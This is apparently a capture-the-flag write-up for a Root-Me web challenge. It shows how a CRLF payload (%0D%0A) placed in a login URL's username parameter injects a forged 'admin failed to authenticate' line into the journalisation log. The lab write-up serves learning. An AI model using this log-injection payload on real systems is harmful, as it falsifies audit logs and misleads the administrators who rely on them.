# Description
```
Inject false data in the journalisation log.
```
# Exploit
- To do this, we will compose a request including the newline characters `cr` and `lf` in the `username` parameter. In URI encoding, they are written as `%0d%0a`.
- First we see user admin exist and when we submit a login when have this URL
```
http://challenge01.root-me.org/web-serveur/ch14/?username=test&password=test
```
- So we try injection CRL ``http://challenge01.root-me.org//web-serveur/ch14/index.php?username=admin%0D%0Aadmin&password=test``
- and we have this : 
```
admin
admin failed to authenticate.
````
- We are now going to make the admin believe that he tried to log in but was unsuccessful.
![alt text](/img/image-14.png)